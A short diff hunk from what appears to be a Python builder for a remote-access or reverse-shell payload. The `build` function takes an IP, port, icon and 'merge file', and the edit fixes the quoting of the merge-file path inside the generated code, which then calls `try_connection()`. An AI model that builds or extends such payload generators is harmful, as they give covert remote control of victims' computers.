@@ -6,7 +6,7 @@ from shutil import copyfile, rmtree
 def build(ip, port, icon_file, merge_file, name):
     if merge_file != None:
         code = f"""
-open_merge_file({merge_file})
+open_merge_file('{merge_file}')
 ip = '{ip}'
 port = {port}
 try_connection()
